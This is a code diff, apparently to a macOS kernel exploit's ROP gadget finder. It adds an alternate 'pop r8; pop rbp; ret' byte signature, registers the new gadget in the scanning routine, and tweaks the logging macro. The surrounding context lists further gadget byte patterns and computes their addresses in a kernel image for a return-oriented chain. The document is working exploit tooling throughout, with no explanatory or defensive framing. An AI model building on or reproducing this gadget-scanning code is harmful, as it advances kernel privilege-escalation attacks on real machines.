@@ -15,6 +15,7 @@
 #define _ZN7OSArray13initWithArrayEPKS_j OSArray_initWithArray
 // ...or for general aliasing.
 #define mach_vm_wire_external mach_vm_wire
+#define pop_r8_pop_rbp_alt pop_r8_pop_rbp
 
 #define STRINGIFY_EXPAND(s) #s
 
@@ -38,7 +39,7 @@ do \
         if(_gadget) \
         { \
             rop->name = _gadget - kernel - seg->fileoff + seg->vmaddr; \
-            LOG("%-30s: 0x%016llx", #name, rop->name); \
+            LOG("%-30s: 0x%016llx", STRINGIFY_EXPAND(name), rop->name); \
         } \
     } \
 } while(0)
@@ -64,6 +65,7 @@ uint8_t gad__pop_rsi[]                          = { 0x5e, 0xc3 };               
 uint8_t gad__pop_rdx[]                          = { 0x5a, 0xc3 };                   // pop rdx; ret;
 uint8_t gad__pop_rcx[]                          = { 0x59, 0xc3 };                   // pop rcx; ret;
 uint8_t gad__pop_r8_pop_rbp[]                   = { 0x41, 0x58, 0x5d, 0xc3 };       // pop r8; pop rbp; ret;
+uint8_t gad__pop_r8_pop_rbp_alt[]               = { 0x47, 0x58, 0x5d, 0xc3 };       // pop r8; pop rbp; ret;
 uint8_t gad__push_rbp_mov_rax__rdi__pop_rbp[]   = { 0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0x5d, 0xc3 }; // push rbp; mov rbp, rsp; mov rax, [rdi]; pop rbp; ret;
 uint8_t gad__mov_rax__rdi__pop_rbp[]            = { 0x48, 0x8b, 0x07, 0x5d, 0xc3 }; // mov rax, [rdi]; pop rbp; ret;
 uint8_t gad__mov__rdi__rax_pop_rbp[]            = { 0x48, 0x89, 0x07, 0x5d, 0xc3 }; // mov [rdi], rax; pop rbp; ret;
@@ -166,6 +168,7 @@ int rop_gadgets(rop_t *rop, void *k)
                 GADGET(pop_rdx);
                 GADGET(pop_rcx);
                 GADGET(pop_r8_pop_rbp);
+                GADGET(pop_r8_pop_rbp_alt);
                 GADGET(push_rbp_mov_rax__rdi__pop_rbp);
                 GADGET(mov_rax__rdi__pop_rbp);
                 GADGET(mov__rdi__rax_pop_rbp);
